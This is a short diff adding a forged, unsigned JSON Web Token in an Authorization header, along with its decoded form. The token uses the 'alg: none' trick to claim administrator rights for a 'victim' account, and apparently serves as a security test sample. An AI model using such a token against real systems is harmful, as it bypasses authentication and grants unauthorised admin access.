@@ -1,0 +1,5 @@
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0MiIsImVtYWlsIjoidmljdGltQGV4YW1wbGUuY29tIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.
+
+Decoded:
+header  = {"alg":"none","typ":"JWT"}
+payload = {"sub":"42","email":"victim@example.com","role":"admin","iat":1700000000}
